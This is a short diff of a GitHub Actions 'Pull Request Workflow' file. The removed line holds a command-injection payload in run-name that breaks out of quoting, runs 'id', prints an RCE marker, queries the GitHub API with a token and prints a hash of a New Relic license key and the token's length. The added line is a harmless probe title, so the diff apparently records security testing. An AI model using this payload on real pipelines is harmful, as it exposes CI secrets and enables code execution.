@@ -1,5 +1,5 @@
 name: Pull Request Workflow
-run-name: 'x";id;echo RCE_CONFIRMED;curl -s -H "Authorization: Bearer $GHA_TOKEN" https://api.github.com/user;echo;echo "LICEN=$(printf %s "$NEW_RELIC_LICENSE_KEY" | sha256sum | cut -c1-16)";echo "TOKL=${#GHA_TOKEN}";#'
+run-name: 'probe-title-1'
 on: [pull_request]
 
 jobs:
